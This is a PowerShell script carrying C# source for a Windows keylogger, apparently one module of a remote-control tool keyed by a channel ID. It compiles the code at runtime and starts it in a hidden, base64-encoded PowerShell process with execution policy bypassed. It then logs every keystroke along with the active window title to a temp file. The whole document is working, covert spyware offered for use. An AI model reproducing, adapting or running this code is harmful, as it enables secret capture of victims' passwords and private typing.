$ProgressPreference = 'SilentlyContinue'
param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$errorLog = "$env:TEMP\keylog_error_$channelID.txt"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
$readyFile = "$env:TEMP\keylog_ready_$channelID.txt"
$csharpFile = "$env:TEMP\keylog_csharp_$channelID.cs"

# Clean up previous run files
Remove-Item $pidFile, $readyFile, $errorLog, $csharpFile -Force -ErrorAction SilentlyContinue

# Kill any previous keylogger process for this channel
if (Test-Path $pidFile) {
    $oldPid = Get-Content $pidFile
    Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
    Remove-Item $pidFile -Force
}

# C# code (compatible with older .NET versions)
$cSharpCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class Keylogger
{
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logFile;
    private static StreamWriter _writer;

    public static void Start(string logFile)
    {
        _logFile = logFile;
        _writer = new StreamWriter(logFile, true) { AutoFlush = true };

        string readyFile = Path.Combine(Path.GetTempPath(), "keylog_ready_" + Process.GetCurrentProcess().Id + ".txt");
        File.WriteAllText(readyFile, "ready");

        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
        Application.Run();
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string windowTitle = "";
            IntPtr handle = GetForegroundWindow();
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            if (GetWindowText(handle, buff, nChars) > 0)
                windowTitle = buff.ToString();

            string keyName = ((System.Windows.Forms.Keys)vkCode).ToString();
            // Use string.Format for compatibility
            string line = string.Format("[{0:HH:mm:ss}][{1}] {2}", DateTime.Now, windowTitle, keyName);
            _writer.WriteLine(line);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@

# Save C# code to a temporary file
$cSharpCode | Out-File -FilePath $csharpFile -Encoding utf8

# PowerShell script to compile and run
$psScript = @"
try {
    Add-Type -Path "$csharpFile" -ReferencedAssemblies "System.Windows.Forms" -ErrorAction Stop
    [Keylogger]::Start("$logFile")
} catch {
    `$errorMsg = "Compilation error: `$_`n`$(`$_.ScriptStackTrace)`n`$(`$_.InvocationInfo.PositionMessage)"
    [System.IO.File]::WriteAllText("$errorLog", `$errorMsg)
}
"@

# Encode and launch hidden PowerShell process
$bytes = [System.Text.Encoding]::Unicode.GetBytes($psScript)
$encodedCommand = [Convert]::ToBase64String($bytes)

$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
$p = [System.Diagnostics.Process]::Start($psi)

# Wait for ready file (max 5 seconds)
$timeout = 5
$readyPath = "$env:TEMP\keylog_ready_$($p.Id).txt"
while ($timeout -gt 0 -and -not (Test-Path $readyPath)) {
    Start-Sleep -Milliseconds 500
    $timeout -= 0.5
}
Remove-Item $readyPath -Force -ErrorAction SilentlyContinue

if ($p.HasExited) {
    if (Test-Path $errorLog) {
        $errorMsg = Get-Content $errorLog -Raw
        Write-Output "Keylogger failed to start. Compilation errors:`n$errorMsg"
        Remove-Item $errorLog -Force
    } else {
        Write-Output "Keylogger process exited unexpectedly with no error log."
    }
    Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
} else {
    $p.Id | Out-File -FilePath $pidFile -Force
    Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"
}